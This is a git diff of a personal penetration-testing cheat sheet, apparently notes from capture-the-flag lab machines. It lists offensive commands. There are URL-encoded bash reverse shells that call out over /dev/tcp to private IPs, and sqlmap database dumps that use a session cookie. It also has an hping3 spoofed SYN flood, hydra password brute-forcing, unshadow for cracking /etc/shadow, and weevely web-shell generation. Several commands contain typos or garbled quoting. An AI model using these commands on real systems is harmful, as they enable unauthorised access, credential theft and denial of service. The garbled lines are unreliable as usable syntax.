@@ -79,7 +79,7 @@ curl -O 192.168.0.200:8000/<semaphore>
 notes use system program in a a script using the effective user id of the
 script 
 ##List Users
-wpscan -aurl <ip> --enumerate u
+wpscan --url <ip> --enumerate u
 exiftools <image file name>
 must add the below in order to install 
 plugin
@@ -236,6 +236,7 @@ HEAD / HTTP/1.1
 nmap -sV <ip address>
 #####Address bar reverse shell
 http://192.168.0.109/index.php?page=mailer&mail=bash%20-c%20%22bash%20-i%3E%26%2Fdev%2Ftcp%2F192.168.0.108%2f55555%200%3E%261%22
+http://192.168.0.108/index.php?page=mailer&mail=bash%20-c%20%22bash%20-i%3E%26%2Fdev%2Ftcp%2F192.168.0.200%2f4444%200%3E%261%22
 weevely remove.php extentsion add php extension after upload
 weevely generate <password><filename> no php extension
 chmod 777
@@ -513,6 +514,7 @@ ________________________________________
 
 
 ___JOHN
+
 
 umask 077
 unshadow /etc/passwd /etc/shadow > passwd
@@ -814,7 +816,56 @@ xterm -display 192.168.56.1:1
 
 ________sqlmap
 dump all databases
+
+sqlmap -u ‘http://192.168.2.14/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user&#8217; -p add_value –current-db
  sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16"  --dbs
 dump tables
 sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16" -D mysql --tables --dump --level=2 --risk=3
 tcpdump src <host ip>
+xalan -html -in pegasus_arp_scan.xml -out pegasus_arp.html
+_____hping3
+++anonymous Syn flood
+hping3 -S --flood --interface eth0 --rand-source 192.168.0.102 
+[+]spoofed scan
+  hping -I eth0 -a 192.168.10.1 -S 192.168.10.33
+hping3 -I eth0 -z -t 6 -S hacker -p 143
+[+]++like firewalk
+hping3 -I eth0 -z -t 6 -S hacker -p 143
+
+_________Reverse engineering
+  hexdump test.bin test.hex
+get rid of first column
+
+cat test.hex | awk '{print substr($0, index($0,$2))}'
+$0 is the whole file 
+perl -e 'local $/; print unpack "H*", <>' file
+this was done on test.bin
+zico
+iconv -f ISO8859-1 -t UTF8 file.sql > file-utf8.sql
+hydra zico http-post-form "/dbadmin/test_db.php:password=^PASS^&remember=yes&submit=Log In&proc_name=true&Login:Incorrect Password" -l null -P $PASSLIST
+
+
+___MORIA
+for port in 77 101 108 111 110;do xterm -T "listening on port ${port}" -hold -e ncat -klvp ${port} &;done
+
+____________-
+
+cat /etc/fstab show mounted disks
+_________/etc/shadown
+[+] what type of encryption
+
+
+    does not have a $ sign, DES is used;
+    starts by $1$, MD5 is used;
+    starts by $2$ or $2a$, Blowfish is used;
+    starts by $5$, SHA-256 is used;
+    starts by $6$, SHA-512 is used.
+  [+]On modern Linux systems, you want to avoid DES and MD5. DES algorithm for password encryption will limit the size of the password to 8 characters and is really easy to crack. MD5 doesn't present the same length weakness but is pretty quick to brute force compared to other algorithms. 
+
+_________-lsof
+lsof -i UDP -n -P
+lsof -i TCP -n -P
+very powerful
+nikto -h wally -port 60080 -root "/?page=" 
+__filter php bypass
+text/x-php
